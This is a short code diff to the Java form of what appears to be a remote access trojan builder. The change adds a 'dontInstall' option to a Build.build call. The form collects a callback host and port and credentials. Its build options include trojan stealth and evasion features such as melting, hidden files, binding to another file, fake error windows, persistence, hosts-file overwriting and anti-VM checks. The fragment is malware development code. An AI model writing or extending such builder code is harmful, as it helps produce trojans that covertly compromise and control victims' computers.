@@ -279,6 +279,7 @@ public class FrameBuildMinimal extends JFrame {
 				String[] address = new String[] { txtHost.getText().trim() + ":" + spPort.getValue().toString() };
 				String id = txtId.getText().trim();
 				String pass = txtPass.getText().trim();
+				boolean dontInstall = false;
 				int droppath = cbLocation.getSelectedIndex();
 				int reconSec = 10;
 				String name = txtFile.getText().trim();
@@ -318,7 +319,7 @@ public class FrameBuildMinimal extends JFrame {
 				osconfig.addOS(OperatingSystem.LINUX);
 				boolean antivm = false;
 
-				Build.build(l, Globals.getStub(), file, address, id, pass, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, droptarget, usemutex, mutexport, pluginlist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, null, antivm);
+				Build.build(l, Globals.getStub(), file, address, id, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, droptarget, usemutex, mutexport, pluginlist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, null, antivm);
 
 				Settings.getGlobal().setVal("baddresses", address);
 				Settings.getGlobal().setVal("bid", id);
